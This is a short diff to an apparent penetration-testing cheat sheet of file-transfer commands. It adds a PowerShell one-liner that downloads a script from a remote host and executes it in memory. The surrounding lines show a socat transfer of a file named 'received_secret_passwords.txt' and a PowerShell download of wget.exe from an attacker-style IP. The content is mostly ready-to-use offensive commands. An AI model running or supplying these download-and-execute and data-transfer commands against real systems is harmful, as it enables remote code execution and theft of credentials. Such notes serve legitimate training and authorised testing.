@@ -49,6 +49,9 @@ socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
 ```
 # download a file
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
+# loads file in memory and runs it
+iex (iwr http://192.168.119.217/Sherlock.ps1 -UseBasicParsing)
+
 ```
 
 ## Powercat
